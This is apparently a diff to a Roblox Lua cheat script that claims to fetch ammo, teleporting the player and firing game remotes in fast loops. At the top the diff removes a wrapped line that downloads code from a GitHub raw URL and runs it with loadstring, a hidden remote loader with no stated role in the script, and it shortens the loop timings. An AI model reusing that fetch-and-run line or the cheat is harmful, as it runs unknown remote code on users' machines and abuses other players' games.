@@ -1,7 +1,3 @@
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/downloads/refs/heads/main/happy"))()
-end)
-
 --// 🔫 SCRIPT GET AMMO FIXADO E OTIMIZADO
 
 local Players = game:GetService("Players")
@@ -35,11 +31,11 @@ local teleportPositions = {
 
 }
 
-local REMOTE_LOOP_DURATION = 5
+local REMOTE_LOOP_DURATION = 3
 
-local TELEPORT_INTERVAL = 0.1
+local TELEPORT_INTERVAL = 0
 
-local FIRE_LOOP_STEP = 0.0
+local FIRE_LOOP_STEP = 0
 
 -- ===== MENSAGEM CENTRAL =====
 
